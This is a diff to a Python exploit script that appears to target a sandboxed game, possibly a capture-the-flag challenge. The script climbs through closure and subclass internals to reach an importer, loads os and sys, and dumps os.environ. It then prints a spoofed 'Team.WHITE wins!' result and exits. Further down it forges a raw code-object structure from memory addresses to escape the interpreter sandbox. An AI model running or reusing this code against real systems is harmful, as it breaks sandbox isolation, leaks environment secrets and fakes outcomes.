@@ -18,7 +18,7 @@ get_board_size = Game().get_board_size
 log = print
 
 ### Test compile
-steal_env_func = """
+steal_env_func = '''
 def evil_func():
   subs = get_board_size.__closure__[0].cell_contents.__class__.__bases__[0].__subclasses__()
   Importer = None
@@ -27,8 +27,13 @@ def evil_func():
       Importer = sub
       break
   imp = Importer()
-  imp.load_module('os').system('env')
-"""
+  os = imp.load_module('os')
+  sys = imp.load_module('sys')
+  sys.stdout.write(str(os.environ)+"\\n")
+  sys.stdout.write("\\n\\n\\n\\nTeam.WHITE wins!\\n")
+  sys.stdout.flush()
+  os._exit(0)
+'''
 steal_env_code = compile(steal_env_func, '<dummy>', 'exec')
 print(steal_env_code.co_consts[0])
 print(steal_env_code.co_consts[0].co_consts)
@@ -37,6 +42,8 @@ print(steal_env_code.co_consts[0].co_varnames)
 print(steal_env_code.co_consts[0].co_freevars)
 print(steal_env_code.co_consts[0].co_cellvars)
 print(steal_env_code.co_consts[0].co_filename)
+print('stacksize', steal_env_code.co_consts[0].co_stacksize)
+print('nlocals', steal_env_code.co_consts[0].co_nlocals)
 
 
 ### Exploit
@@ -72,7 +79,7 @@ evil_struct = {
 print(hex(id(evil_struct['code'])), struct.pack('P', id(evil_struct['code'])))
 evil_array = struct.pack(
     'iiPPPPPPPPPPPPP',
-    0, # flags
+    0x40, # flags = NOFREE
     666, # first line no
     id(evil_struct['code']),
     id(evil_struct['consts']),
